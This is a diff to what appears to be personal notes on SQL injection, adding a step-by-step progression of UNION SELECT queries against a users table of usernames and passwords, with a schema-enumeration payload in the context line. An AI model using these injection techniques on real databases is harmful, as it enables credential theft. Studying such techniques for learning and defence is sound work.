@@ -82,3 +82,29 @@ SELECT concat('Database PWNed : ',(schema_name)) FROM information_schema.schemat
 ---
 
 ### Union + Group Concat
+
+#### Union Select Progression:
+
+````sql
+## Original example v1:
+select username,password from users;
+
+## Original example v2:
+select username,password from users where username = 'F0n3';
+
+## Basic Union Select (v1)
+select username,password from users union select 1,2;
+
+## Condition Union Select (v2):
+select username,password from users where username = 'F0n3' union select 1,2;
+
+## Condition Union Select, strings a palcer (v2):
+select username,password from users where username = 'F0n3' union select 'izquierda','derecha';
+````
+
+---
+
+#### Union Select Progression:
+
+````sql
+````
